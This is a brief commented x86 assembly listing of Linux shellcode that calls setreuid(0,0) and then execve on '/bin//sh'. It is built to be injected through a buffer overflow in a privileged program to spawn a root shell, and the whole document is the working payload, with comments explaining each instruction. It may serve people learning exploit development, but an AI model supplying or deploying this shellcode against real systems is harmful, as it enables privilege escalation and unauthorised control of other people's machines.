xor eax, eax         ;clears eax
mov al, 0xcb         ;setreuid
xor ebx, ebx         ;setreuid value to 0
xor ecx, ecx         ;setreuid value to 0
int 0x80             ;preforms syscall
xor eax, eax         ;clears eax
push eax             ;puts nullbyte behind /bin//sh
mov al, 0x0b         ;sets execve syscall
push 0x68732f2f      ;//sh
push 0x6e69622f      ;/bin
mov ebx, esp         ;makes the value of ebx the stack pointer, which is /bin//sh
xor ecx, ecx         ;clears ecx
xor edx, edx         ;clears edx
int 0x80             ;preforms syscall
